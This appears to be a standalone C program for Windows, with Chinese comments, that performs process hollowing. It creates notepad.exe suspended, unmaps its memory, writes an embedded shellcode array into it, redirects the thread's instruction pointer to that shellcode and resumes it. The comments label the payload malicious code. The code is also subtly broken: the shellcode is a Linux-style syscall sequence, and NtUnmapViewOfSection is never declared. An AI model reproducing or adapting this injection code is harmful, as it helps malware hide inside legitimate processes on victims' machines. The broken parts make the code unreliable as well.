#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] =
"\x48\x31\xc0\x50\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50"
"\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05";

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    // 创建挂起的进程
    if (!CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("无法创建进程\n");
        return 1;
    }

    // 取消映射合法进程的内存
    if (NtUnmapViewOfSection(pi.hProcess, (PVOID)0x400000) != 0) {
        printf("无法取消映射内存\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    // 分配内存并写入恶意代码
    LPVOID pRemoteCode = VirtualAllocEx(pi.hProcess, (PVOID)0x400000, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteCode == NULL) {
        printf("无法分配内存\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    if (!WriteProcessMemory(pi.hProcess, pRemoteCode, shellcode, sizeof(shellcode), NULL)) {
        printf("无法写入内存\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    // 修改进程上下文
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("无法获取线程上下文\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    ctx.Rip = (DWORD64)pRemoteCode; // 修改RIP寄存器指向Shellcode

    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("无法设置线程上下文\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    // 恢复进程执行
    if (ResumeThread(pi.hThread) == -1) {
        printf("无法恢复线程\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("进程空洞注入成功\n");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
